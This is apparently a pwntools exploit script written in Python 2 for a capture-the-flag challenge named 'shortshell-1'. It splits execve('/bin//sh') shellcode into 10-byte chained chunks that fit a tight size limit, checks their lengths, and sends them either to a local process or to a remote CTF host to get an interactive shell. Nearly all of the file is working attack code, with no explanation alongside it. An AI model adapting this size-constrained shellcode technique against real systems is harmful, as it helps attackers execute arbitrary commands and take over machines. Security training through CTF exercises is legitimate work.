import os
import pwn
import sys

pwn.context.arch = 'amd64'

f = lambda x: hex(pwn.u32(x))
shellarr = []

def run():
    p = pwn.process('./shortshell-1', env=envdic)
    raw_input('@')
    for i in shellarr:
        p.send(pwn.asm(i))    
    p.interactive()

def remoterun():
    r = pwn.remote('csie.ctf.tw',10122)
    for i in shellarr:
        r.send(pwn.asm(i))    
    r.interactive()

def prun():
    needmod = []
    for idx, ele in enumerate(shellarr):
        print str(idx) + '--------------------------'
        print pwn.disasm(pwn.asm(ele))
        print "---------------- size : " + str(len(pwn.asm(ele))) + "  "
        if len(pwn.asm(ele)) != 10:
            needmod.append(idx)
    
    print("===============================================================")
    print "  below need patch or reduce  "
    for i in needmod:
        print i
        

envdic = {
    'LD_PRELOAD' : '/home/robinlin/preeny/x86_64-linux-gnu/desock.so:/home/robinlin/preeny/x86_64-linux-gnu/defork.so:/home/robinlin/preeny/x86_64-linux-gnu/dealarm.so'
}

init = """
        lea rbx, [r8-0xcf]
        jmp rbx
        nop
        """

final = """
        pop r15
        pop rax
        pop rdx
        pop rsi
        push rsp
        pop rdi
        syscall
        nop
        """

pad0  = """
        pop r15
        xor rax, rax
        push rax
        jmp rbx
        nop
        nop
        """

pushsh = """
        pop r15
        push {}
        jmp rbx
        nop
        """.format(f('//sh'))

sh2r9 = """
        pop r15
        pop r9
        shl r9, 32
        jmp rbx
        """

pushbin = """
        pop r15
        push {}
        jmp rbx
        nop
        """.format(f('/bin'))

r9orbin = """
        pop r15
        or r9, QWORD PTR [rsp]
        pop r15
        jmp rbx
        """


pushbinshn0s = """
        pop r15
        push r9
        push 0
        push 0
        jmp rbx
        """

push59 = """
        pop r15
        push 59
        jmp rbx
        nop
        nop
        nop
        nop
        """

shellarr.append(init)
########################

shellarr.append(pad0)
shellarr.append(pushsh)
shellarr.append(sh2r9)
shellarr.append(pushbin)
shellarr.append(r9orbin)
shellarr.append(pushbinshn0s)
shellarr.append(push59)

########################
shellarr.append(final)

if len(sys.argv) != 2:
    print("usage: python [t/r/rr]")
    exit(-1)

if sys.argv[1] == 't':
    prun()

if sys.argv[1] == 'r':
    run()

if sys.argv[1] == 'rr':
    remoterun()
# run()
# prun()
# print pwn.disasm(b1)
# print disasm(final)
# print (a)
